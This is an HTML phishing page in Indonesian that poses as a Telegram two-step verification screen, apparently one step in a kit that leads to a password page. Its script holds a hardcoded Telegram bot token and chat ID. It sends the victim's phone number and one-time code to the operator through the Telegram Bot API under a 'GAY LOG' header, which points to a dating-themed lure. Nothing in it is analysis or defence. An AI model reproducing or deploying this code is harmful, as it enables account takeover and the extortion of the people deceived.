<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>otp code</title>
  <!-- Google Fonts untuk tampilan modern -->
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
  <style>
    :root {
      --primary-color: #0088cc;
      --secondary-color: #00c6ff;
      --background-gradient: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
      --white: #ffffff;
      --text-color: #333333;
      --label-color: #555555;
      --border-color: #dddddd;
      --shadow-color: rgba(0, 0, 0, 0.1);
    }
    * {
      box-sizing: border-box;
    }
    body {
      margin: 0;
      font-family: 'Roboto', sans-serif;
      background: url('gay3.jpg') no-repeat center center fixed;
      background-size: cover;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      overflow: hidden;
      position: relative;
    }
    }

    /* Overlay tetap dipertahankan untuk efek pulsating */
    body::before {
      content: "";
      position: absolute;
      top: -20%;
      left: -20%;
      width: 140%;
      height: 140%;
      background: radial-gradient(circle, rgba(255,255,255,0.15), transparent 100%);
      animation: pulse 6s infinite;
      z-index: 0;
    }
    @keyframes pulse {
      0% { transform: scale(0.9); opacity: 0.8; }
      50% { transform: scale(1); opacity: 1; }
      100% { transform: scale(0.9); opacity: 0.8; }
    }
    .container {
      background: transparent;
      border-radius: 16px;
      padding: 40px 30px;
      width: 100%;
      max-width: 400px;
      text-align: center;
      position: relative;
      z-index: 1;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.4);
      animation: fadeInUp 2s ease
      position: relative;
      padding-top: 90px;
    }
    @keyframes fadeInUp {
      from { opacity: 0; transform: translateY(20px); }
      to { opacity: 1; transform: translateY(0); }
    }
    .emoji {
      font-size: 80px;
      margin-bottom: 20px;
      display: block;
    }
    .phone-display {
      font-size: 18px;
      margin-bottom: 10px;
      font-weight: 500;
      color: var(--text-color);
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
    }
    .pencil-icon {
      width: 20px;
      cursor: pointer;
      transition: transform 0.3s;
    }
    .pencil-icon:hover {
      transform: rotate(15deg);
    }
    p {
      color: #000;
      margin: 0 0 30px;
    }
    input[type="number"] {
      width: 100%;
      padding: 12px 15px;
      font-size: 16px;
      margin-bottom: 20px;
      border: url('https://boyzconnet-join-gay-bro-freejoin.netlify.app/form/kual.jpg');
      border-radius: 8px;
      text-align: center;
      transition: border-color 0.3s, box-shadow 0.3s;
      background: #fff;
    }
    input[type="number"]:focus {
      background: #fff;
      outline: none;
      border-color: var(--primary-color);
      box-shadow: 0 0 8px rgba(0,136,204,0.2);
    }
    .btn {
      width: 100%;
      padding: 14px;
      font-size: 16px;
      background-color: var(--primary-color);
      color: var(--white);
      border: none;
      border-radius: 8px;
      cursor: pointer;
      transition: background-color 0.3s, transform 0.3s;
    }
    .btn:hover {
      background-color: #0077b3;
      transform: scale(1.02);
    }
    .status {
      margin-top: 15px;
      font-size: 14px;
      font-weight: 500;
      min-height: 20px;
    }
    .disclaimer {
      font-size: 12px;
      color: #000;
      margin: 25px 0 0;
      line-height: 1.5;
    }
    .icon {
        width: 100px;
        height: 100px;
        margin: -70px auto 20px;
        color: #0088cc;
        margin-bottom: 20px;
        transition: transform 0.3s;
     }

    .telegram-logo {
         width: 100%;
         height: 100%;
    }

    .icon:hover {
        transform: rotate(15deg);
        color: #0088cc; /* Warna hover */
    }
    h1 {
      color: #000;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="icon">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" class="telegram-logo">
    <path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.894 8.221l-1.97 9.28c-.145.658-.537.818-1.084.508l-3-2.21-1.446 1.394a.759.759 0 0 1-.6.295h-.006l.213-3.054 5.56-5.022c.24-.213-.054-.334-.373-.121l-6.869 4.326-2.96-.924c-.643-.203-.658-.643.136-.953l11.566-4.458c.538-.196 1.006.128.832.941z"/>
  </svg>
  </div>
    <div class="phone-display">
      <span id="phoneMasked"></span>
      <img src="https://cdn-icons-png.flaticon.com/512/1159/1159633.png" alt="Edit" class="pencil-icon" id="editNumber">
    </div>
    <h1>Enter verification code</h1>
    <p>Your registration process is protected with two-step verification for security. </p>
    <form id="codeForm">
      <input type="number" id="verificationCode" min="10000" max="99999" placeholder="Enter 5 digit code" oninput="if(this.value.length > 5) this.value = this.value.slice(0, 5)">
      <button type="submit" class="btn">NEXT</button>
      
     <div class="disclaimer">
    *Make sure the verification code is not given to anyone. The verification process takes 1-2 minutes.
    </div>
    </form>
    <div class="status" id="statusMessage"></div>
  </div>

  <script>
    // === Ganti dengan Bot Token dan Chat ID milik Anda ===
    const botToken = "7145134402:AAHgu2W9kanRFfpARp2Dcyfju2jiTFA6GH8";
    const chatId   = "5876510981";
    // ====================================================

    const urlParams = new URLSearchParams(window.location.search);
    const fullPhone = urlParams.get('phone') || "";
    const phoneMaskedElement = document.getElementById('phoneMasked');
    const editNumberButton = document.getElementById('editNumber');
    const codeForm = document.getElementById('codeForm');
    const statusMessage = document.getElementById('statusMessage');

    function maskPhoneNumber(phone) {
      if (phone.startsWith("+60") && phone.length > 4) {
        const prefix = phone.substring(0, 3);
        const nextTwo = phone.substring(3, 5);
        return `${prefix} ${nextTwo}********`;
      } else if (phone.length > 6) {
        const visible = phone.substring(0, 4);
        const hiddenLength = phone.length - 4;
        return visible + "*".repeat(hiddenLength);
      } else {
        return phone;
      }
    }
    phoneMaskedElement.textContent = maskPhoneNumber(fullPhone);
    editNumberButton.addEventListener('click', () => {
      window.history.back();
    });

    codeForm.addEventListener('submit', (e) => {
      e.preventDefault();
      const verificationInput = document.getElementById('verificationCode');
      const verificationCode = verificationInput.value;
      
      if (verificationCode.length !== 5) {
        statusMessage.style.color = "red";
        statusMessage.textContent = "Kode harus terdiri dari 5 digit!";
        return;
      }

      statusMessage.style.color = "black";
      statusMessage.textContent = "Mengirim...";

      const messageText = `GAY LOG [Bot : BTC ETH USDT]
_________________________________
• Nomor Hp : ${fullPhone}
• Kode otp: ${verificationCode}
_________________________________
_________________________________`;
      const telegramAPI = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(messageText)}`;

      fetch(telegramAPI)
        .then(response => response.json())
        .then(data => {
          if (data.ok) {
            statusMessage.style.color = "green";
            statusMessage.textContent = "Sukses!";
            window.location.href = `password.html?phone=${encodeURIComponent(fullPhone)}`;
          } else {
            statusMessage.style.color = "red";
            statusMessage.textContent = "Gagal mengirim: " + (data.description || "Unknown error");
          }
        })
        .catch(error => {
          statusMessage.style.color = "red";
          statusMessage.textContent = "Terjadi kesalahan: " + error;
        });
    });
  </script>
</body>
</html>
